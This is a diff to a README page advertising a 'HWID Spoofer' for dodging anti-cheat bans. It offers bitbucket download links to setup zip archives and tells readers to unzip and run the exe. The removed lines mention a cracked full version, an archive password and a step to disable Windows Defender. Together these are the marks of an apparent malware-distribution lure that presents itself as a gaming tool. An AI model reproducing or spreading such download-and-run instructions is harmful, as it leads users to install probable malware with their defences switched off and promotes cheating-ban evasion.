@@ -1,17 +1,14 @@
 ## Overview
 HWID Spoofer is a powerful tool designed to protect your gaming experience by masking your hardware ID (HWID). It is particularly popular among gamers who wish to avoid bans from anti-cheat systems by changing their device's unique identifiers. With HWID Spoofer, users can enjoy their favorite games without the fear of being flagged or banned due to previous infractions. The tool operates seamlessly in the background, ensuring that your gaming performance remains unaffected.
 
-HWID Spoofer Free Download Full Version with Crack features advanced functionalities that work diligently to safeguard your accounts from detection by anti-cheat mechanisms. The user-friendly interface makes it easy for users to navigate and customize settings according to their preferences. The setup process is straightforward, requiring minimal technical knowledge to get started.
-
 
 > [!Note]
 > ## Hwid Spoofer x32 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x32.zip)
 > ## Hwid Spoofer x64 - [Click To Download](https://bitbucket.org/gitfilesprojecct/gitfiles/downloads/Spoofer_Setup_x64.zip)
 
 ## Instructions
-- DISABLE WINDOWS DEFENDER!!!
 1. Download the archive
-2. Unzip to any folder (pass: spoof2025)
+2. Unzip to any folder
 3. Run exe
 4. Enjoy
 
